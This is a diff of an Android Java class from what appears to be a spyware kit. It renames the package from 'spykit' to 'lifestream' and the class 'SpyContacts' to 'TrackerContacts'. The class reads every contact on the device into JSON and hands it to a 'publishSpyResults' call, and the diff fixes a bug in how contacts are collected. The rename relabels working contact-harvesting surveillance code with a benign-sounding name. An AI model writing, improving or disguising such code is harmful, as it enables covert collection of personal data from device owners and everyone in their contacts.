@@ -1,4 +1,4 @@
-package net.datadeer.app.spykit;
+package net.datadeer.app.lifestream;
 
 import android.content.ContentResolver;
 import android.database.Cursor;
@@ -8,17 +8,21 @@ import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
-public class SpyContacts implements SpyMethod {
+public class TrackerContacts implements TrackerMethod {
     @Override
-    public void spy(SpyManager that) {
+    public void spy() {
+
+        TrackerManager that = TrackerManager.get();
+        if (that==null) return;
+
         JSONArray contacts = new JSONArray();
         JSONObject container = new JSONObject();
         try {
             ContentResolver cr = that.getContentResolver();
             Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
             if (cur != null && cur.moveToFirst()) {
-                JSONObject contact = new JSONObject();
                 do {
+                    JSONObject contact = new JSONObject();
                     String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                     contact.put("_ID",id);
                     contact.put("DISPLAY_NAME",cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)));
@@ -43,6 +47,11 @@ public class SpyContacts implements SpyMethod {
         } catch (JSONException e) {
             e.printStackTrace();
         }
-        that.publishSpyResults(container);
+        that.publishSpyResults(this,container);
+    }
+
+    @Override
+    public String getName() {
+        return "Contacts";
     }
 }
